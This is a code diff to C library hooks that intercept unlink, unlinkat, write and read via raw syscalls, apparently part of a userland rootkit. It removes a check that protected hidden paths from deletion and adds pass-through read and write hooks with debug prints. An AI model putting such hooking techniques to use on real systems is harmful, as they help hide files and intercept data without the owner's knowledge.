@@ -50,9 +50,7 @@ int unlink(const char *pathname) {
 	struct stat s_buf;
 
 	memset(&s_buf, 0, sizeof(struct stat));
-	if(strstr(pathname, HIDDEN_EXEC_PATH) || strstr(pathname, HIDDEN_PATH)) {
-		return -1;
-	}
+
 
 	return syscall(SYS_UNLINK, pathname);
 }
@@ -66,16 +64,15 @@ int unlinkat(int dirfd, const char * pathname, int flags) {
 	struct stat s_buf;
 	memset(&s_buf, 0, sizeof(struct stat));
 
-	if(strstr(pathname, HIDDEN_EXEC_PATH) || strstr(pathname, HIDDEN_PATH)) {
-		return -1;
-	}
-
 	return syscall(SYS_UNLINKAT, dirfd, pathname, flags);
 }
 
 // WRITE
 
 ssize_t write(int fd, const void *xbuf, size_t count) {
+#ifdef VERBOSE
+    printf("write called\n");
+#endif
 	char buf[256];
 	int logfd;
 	ssize_t output;
@@ -83,4 +80,20 @@ ssize_t write(int fd, const void *xbuf, size_t count) {
 	output = syscall(SYS_WRITE, fd, xbuf, count);
 
 	return output;
+}
+
+// READ
+
+ssize_t read(int fd, void *xbuf, size_t count) {
+#ifdef VERBOSE
+    printf("read called\n");
+#endif
+	struct stat sb;
+	char buf[64];
+	ssize_t output;
+	int logfd;
+
+	output = syscall(SYS_READ, fd, xbuf, count);
+
+    return output;
 }
